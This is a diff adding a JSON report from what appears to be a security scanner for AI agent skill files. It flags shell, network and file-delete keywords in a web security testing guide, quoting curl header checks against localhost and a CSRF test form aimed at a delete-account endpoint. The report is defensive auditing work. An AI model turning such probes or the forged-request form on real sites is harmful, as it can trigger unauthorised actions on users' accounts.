+            "type": "shell-execution",
+            "line": 181,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 182,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "network-access",
+            "line": 182,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 202,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 203,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "network-access",
+            "line": 203,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 216,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 217,
+            "evidence": "curl",
+            "context": "curl -I http://localhost:3000"
+          },
+          {
+            "type": "network-access",
+            "line": 217,
+            "evidence": "http://",
+            "context": "curl -I http://localhost:3000"
+          },
+          {
+            "type": "shell-execution",
+            "line": 228,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 230,
+            "evidence": "curl",
+            "context": "curl -I http://localhost:3000 | grep \"Content-Security-Policy\""
+          },
+          {
+            "type": "network-access",
+            "line": 230,
+            "evidence": "http://",
+            "context": "curl -I http://localhost:3000 | grep \"Content-Security-Policy\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 240,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 242,
+            "evidence": "curl",
+            "context": "curl -I https://yourapp.com | grep \"Strict-Transport-Security\""
+          },
+          {
+            "type": "network-access",
+            "line": 242,
+            "evidence": "https://",
+            "context": "curl -I https://yourapp.com | grep \"Strict-Transport-Security\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 250,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 251,
+            "evidence": "curl",
+            "context": "curl -I http://localhost:3000/dashboard"
+          },
+          {
+            "type": "network-access",
+            "line": 251,
+            "evidence": "http://",
+            "context": "curl -I http://localhost:3000/dashboard"
+          },
+          {
+            "type": "shell-execution",
+            "line": 261,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 263,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/protected-endpoint"
+          },
+          {
+            "type": "network-access",
+            "line": 263,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/protected-endpoint"
+          },
+          {
+            "type": "shell-execution",
+            "line": 274,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 276,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/protected-endpoint \\"
+          },
+          {
+            "type": "network-access",
+            "line": 276,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/protected-endpoint \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 284,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 286,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/posts/user-abc-post-123 \\"
+          },
+          {
+            "type": "network-access",
+            "line": 286,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/posts/user-abc-post-123 \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 298,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 300,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/premium/generate \\"
+          },
+          {
+            "type": "network-access",
+            "line": 300,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/premium/generate \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 314,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 319,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/error-test"
+          },
+          {
+            "type": "network-access",
+            "line": 319,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/error-test"
+          },
+          {
+            "type": "shell-execution",
+            "line": 330,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 332,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/error-test"
+          },
+          {
+            "type": "network-access",
+            "line": 332,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/error-test"
+          },
+          {
+            "type": "shell-execution",
+            "line": 347,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 357,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 366,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 375,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 376,
+            "evidence": "bash",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 376,
+            "evidence": "sh",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "network-access",
+            "line": 388,
+            "evidence": "https://",
+            "context": "**Tool:** https://securityheaders.com/"
+          },
+          {
+            "type": "network-access",
+            "line": 405,
+            "evidence": "https://",
+            "context": "**Tool:** https://observatory.mozilla.org/"
+          },
+          {
+            "type": "network-access",
+            "line": 421,
+            "evidence": "https://",
+            "context": "**Tool:** https://www.ssllabs.com/ssltest/"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 474,
+            "evidence": "DELETE",
+            "context": "- [ ] All POST/PUT/DELETE routes have CSRF protection"
+          },
+          {
+            "type": "network-access",
+            "line": 493,
+            "evidence": "curl",
+            "context": "- [ ] Check security headers: `curl -I https://yourapp.com`"
+          },
+          {
+            "type": "network-access",
+            "line": 493,
+            "evidence": "https://",
+            "context": "- [ ] Check security headers: `curl -I https://yourapp.com`"
+          },
+          {
+            "type": "shell-execution",
+            "line": 506,
+            "evidence": "sh",
+            "context": "### security-test.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 510,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 511,
+            "evidence": "bash",
+            "context": "#!/bin/bash"
+          },
+          {
+            "type": "network-access",
+            "line": 559,
+            "evidence": "curl",
+            "context": "run_test \"X-Frame-Options\" \"curl -I http://localhost:3000\" \"X-Frame-Options: DENY\""
+          },
+          {
+            "type": "network-access",
+            "line": 559,
+            "evidence": "http://",
+            "context": "run_test \"X-Frame-Options\" \"curl -I http://localhost:3000\" \"X-Frame-Options: DENY\""
+          },
+          {
+            "type": "network-access",
+            "line": 560,
+            "evidence": "curl",
+            "context": "run_test \"X-Content-Type-Options\" \"curl -I http://localhost:3000\" \"X-Content-Type-Options: nosniff\""
+          },
+          {
+            "type": "network-access",
+            "line": 560,
+            "evidence": "http://",
+            "context": "run_test \"X-Content-Type-Options\" \"curl -I http://localhost:3000\" \"X-Content-Type-Options: nosniff\""
+          },
+          {
+            "type": "network-access",
+            "line": 561,
+            "evidence": "curl",
+            "context": "run_test \"Content-Security-Policy\" \"curl -I http://localhost:3000\" \"Content-Security-Policy\""
+          },
+          {
+            "type": "network-access",
+            "line": 561,
+            "evidence": "http://",
+            "context": "run_test \"Content-Security-Policy\" \"curl -I http://localhost:3000\" \"Content-Security-Policy\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 579,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 580,
+            "evidence": "bash",
+            "context": "bash scripts/security-test.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 580,
+            "evidence": "sh",
+            "context": "bash scripts/security-test.sh"
+          },
+          {
+            "type": "network-access",
+            "line": 627,
+            "evidence": "http://",
+            "context": "        run: npx wait-on http://localhost:3000"
+          },
+          {
+            "type": "shell-execution",
+            "line": 630,
+            "evidence": "bash",
+            "context": "        run: bash scripts/security-test.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 630,
+            "evidence": "sh",
+            "context": "        run: bash scripts/security-test.sh"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 666,
+            "evidence": "delete",
+            "context": "   <form action=\"http://localhost:3000/api/delete-account\" method=\"POST\">"
+          },
+          {
+            "type": "network-access",
+            "line": 666,
+            "evidence": "http://",
+            "context": "   <form action=\"http://localhost:3000/api/delete-account\" method=\"POST\">"
+          },
+          {
+            "type": "network-access",
+            "line": 704,
+            "evidence": "https://",
+            "context": "- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/"
+          },
+          {
+            "type": "network-access",
+            "line": 705,
+            "evidence": "https://",
+            "context": "- Security Headers Scanner: https://securityheaders.com/"
+          },
+          {
+            "type": "network-access",
+            "line": 706,
+            "evidence": "https://",
+            "context": "- Mozilla Observatory: https://observatory.mozilla.org/"
+          },
+          {
+            "type": "network-access",
+            "line": 707,
+            "evidence": "https://",
+            "context": "- SSL Labs: https://www.ssllabs.com/ssltest/"
+          },
+          {
+            "type": "network-access",
+            "line": 708,
+            "evidence": "https://",
+            "context": "- npm Audit: https://docs.npmjs.com/cli/v8/commands/npm-audit"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    }
+  ],
+  "license_files": [
+    {
+      "path": "LICENSE",
+      "sha256": "e8f0d88e88dafeb5ba3503df8babaf5ef1c49323d6c1751c09989d29740fa919",
+      "preview": "MIT License Copyright (c) 2025 Allen Harper Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal"
+    }
+  ],
+  "warnings": [
+    {
+      "path": "dependency-security/SKILL.md",
+      "type": "review-signal",
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": true
+      }
+    },
+    {
+      "path": "security-awareness/injection-vulnerabilities/SKILL.md",
+      "type": "review-signal",
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": true,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/supply-chain-risks/SKILL.md",
+      "type": "review-signal",
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": true
+      }
+    }
+  ]
+}
